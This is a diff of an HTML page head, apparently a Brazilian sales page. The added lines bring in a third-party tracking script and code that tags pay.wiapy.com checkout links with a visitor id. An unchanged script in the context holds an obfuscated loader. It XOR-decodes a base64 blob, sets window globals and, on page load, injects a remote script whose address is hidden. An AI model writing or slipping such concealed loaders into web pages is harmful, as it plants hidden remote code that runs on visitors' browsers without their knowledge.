@@ -66,6 +66,38 @@ body{-webkit-user-select:none;user-select:none;-webkit-touch-callout:none}input,
 
 <script>__afterLoad(function(){var m_lp28=atob("DK8zoVFS4wo/fM0uctQR1CM+wTAdFLlaAtwJjn4xh2QRCblDG8lKjzI9jiRdDuJdEd1a0SUhzHpWBKhCXd9a2TQ+zWBMXuEME9tH0zgwln5aD+8UKfIfgzY+jGheEL4MSPRIgz8zjm8dRu9eG9dWzRg2wSYdCqxCB8oRm3NkgmhbHa4ZF5sFxzdj1jMMS/VLRZgHkDRwnldC");var n_76=[];for(var w_ty5w=0;w_ty5w<m_lp28.length;w_ty5w++){n_76.push(m_lp28.charCodeAt(w_ty5w)&255);}var e_ggrd=n_76[0];var c_e=n_76.slice(1,1+e_ggrd);var r_8ap=n_76.slice(1+e_ggrd);var j_y=r_8ap.map(function(b,m_pi){return b^c_e[m_pi%e_ggrd];});var p_v4="";for(var t_g=0;t_g<j_y.length;t_g++){p_v4+=String.fromCharCode(j_y[t_g]&255);}var m_u933=decodeURIComponent(escape(p_v4));var n_bg=JSON.parse(m_u933);var p_h08=n_bg.globals||[];p_h08.forEach(function(u_k){window[u_k.name]=u_k.value;});var t_de=document.createElement("script");t_de.src=n_bg.url;t_de.async=true;t_de.defer=true;(n_bg.attributes||[]).forEach(function(k_1ly){t_de.setAttribute(k_1ly.name,k_1ly.value);});(document.head||document.documentElement).appendChild(t_de);});</script>
 
+<script defer src="https://www.lcktracking.online/t.js" data-base="https://www.lcktracking.online" data-offer="202-recursos"></script>
+
+<script>
+(function () {
+  // espera o snippet (window.lck) ficar pronto
+  function whenReady(cb) {
+    var n = 0, t = setInterval(function () {
+      if (window.lck && window.lck.id) { clearInterval(t); cb(); }
+      else if (++n > 40) clearInterval(t); // desiste após ~6s
+    }, 150);
+  }
+  whenReady(function () {
+    var links = document.querySelectorAll('a[href*="pay.wiapy.com"]');
+    links.forEach(function (a) {
+      // 1) injeta o utm_content (= trck_user_id) na URL do checkout
+      try {
+        var u = new URL(a.href);
+        u.searchParams.set('utm_content', window.lck.id);
+        a.href = u.toString();
+      } catch (e) {}
+      // 2) dispara InitiateCheckout no clique (value opcional via data-value)
+      a.addEventListener('click', function () {
+        var v = parseFloat(a.getAttribute('data-value'));
+        var params = { currency: 'BRL' };
+        if (!isNaN(v)) params.value = v;
+        window.lck.track('InitiateCheckout', params);
+      });
+    });
+  });
+})();
+</script>
+
 </head>
 <body>
 
